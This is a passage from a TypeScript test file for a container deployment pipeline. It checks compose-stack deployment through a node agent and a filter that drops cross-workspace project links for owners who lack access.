    expect(h.agentOp).not.toHaveBeenCalled();
    expect(lines.join('\n')).toMatch(/host processes/);

    const audits = inserts.filter((i) => i.table === auditLog).map((i) => i.values);
    expect(audits).toHaveLength(1);
    expect(audits[0]).toMatchObject({ userId: 42, action: 'deploy.failed' });
    expect((audits[0]!['meta'] as { reason: string }).reason).toMatch(/not available for this service/);
  });

  it('brings a compose stack up on the node through the agent', async () => {
    const { db } = makeDb();
    baseSetup(db, { type: 'compose', serverId: 4, composeContent: 'services: {}' });
    collectLogs(1);
    h.builder.buildAndRun.mockClear();
    // The compose builder waits on the container's HEALTH format, not `state`.
    h.agentOp.mockImplementation(async (_db: unknown, _serverId: unknown, op: string) =>
      op === 'docker.inspect'
        ? { exitCode: 0, lines: ['running|healthy|0|0'] }
        : { exitCode: 0, lines: [] },
    );

    await runDeployment(db as never, 1);

    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
    const ops = h.agentOp.mock.calls.map((c) => (c as unknown[])[2] as string);
    // Preflight BEFORE `up`: a broken interpolation or a bad tag must fail the
    // deployment without ever having torn the live stack down.
    expect(ops.indexOf('docker.composeConfig')).toBeLessThan(ops.indexOf('docker.composeUp'));
    expect(ops.indexOf('docker.composePull')).toBeLessThan(ops.indexOf('docker.composeUp'));
    expect(ops).toContain('file.writeWorkspace');
  });

  it('still deploys a service with no server assigned', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest', serverId: null });
    collectLogs(1);
    h.builder.buildAndRun.mockClear();
    h.agentOp.mockClear();

    await runDeployment(db as never, 1);

    expect(h.builder.buildAndRun).toHaveBeenCalled();
    expect(h.agentOp).not.toHaveBeenCalled();
  });
});

/**
 * The route layer refuses cross-tenant project tags; this is the pipeline-side
 * backstop that keeps a link nobody validated from decrypting another
 * workspace's shared env into a container (engine/pipeline.ts
 * filterTrustworthyProjectLinks).
 */
describe('filterTrustworthyProjectLinks', () => {
  const links = [{ projectId: 4 }, { projectId: 9 }];
  const owner = { ownerUserId: 7 as number | null };

  function spyDb() {
    return {
      query: {
        users: { findFirst: vi.fn().mockResolvedValue({ id: 7, isInstanceOperator: false }) },
        // Default: the requested project lives in workspace #1. Individual
        // tests override this for the NULL-workspace case.
        projects: { findFirst: vi.fn().mockResolvedValue({ id: 4, workspaceId: 1 }) },
        workspaceMembers: {
          findFirst: vi.fn(async () => null as null | { workspaceId: number; role: string }),
        },
      },
    };
  }

  it('keeps links into workspaces the owner holds a seat in', async () => {
    const db = spyDb();
    db.query.workspaceMembers.findFirst.mockResolvedValue({ workspaceId: 1, role: 'viewer' });
    const kept = await filterTrustworthyProjectLinks(db as never, owner, [{ projectId: 4 }]);
    expect(kept).toEqual([{ projectId: 4 }]);
  });

  it('drops links into workspaces the owner cannot see', async () => {
    const db = spyDb();
    // Project 4 exists, but the owner holds no seat in its workspace.
    const kept = await filterTrustworthyProjectLinks(db as never, owner, [{ projectId: 4 }]);
    expect(kept).toEqual([]);
  });

  it('drops NULL-workspace (operator-only) projects for non-operators', async () => {
    const db = spyDb();
    db.query.projects.findFirst.mockResolvedValue({ id: 4, workspaceId: null });
    db.query.workspaceMembers.findFirst.mockResolvedValue({ workspaceId: 1, role: 'owner' });
    const kept = await filterTrustworthyProjectLinks(db as never, owner, [{ projectId: 4 }]);
    expect(kept).toEqual([]);
  });

  it('passes every link through for an instance-operator owner', async () => {
    const db = spyDb();
    db.query.users.findFirst.mockResolvedValue({ id: 7, isInstanceOperator: true });
    const kept = await filterTrustworthyProjectLinks(db as never, owner, links);
    expect(kept).toEqual(links);
    // The operator decision short-circuits before any per-project lookup.
    expect(db.query.projects.findFirst).not.toHaveBeenCalled();
  });

  it('drops every link when the service has no owner at all', async () => {
    const db = spyDb();
    const kept = await filterTrustworthyProjectLinks(db as never, { ownerUserId: null }, links);
    expect(kept).toEqual([]);
  });
});
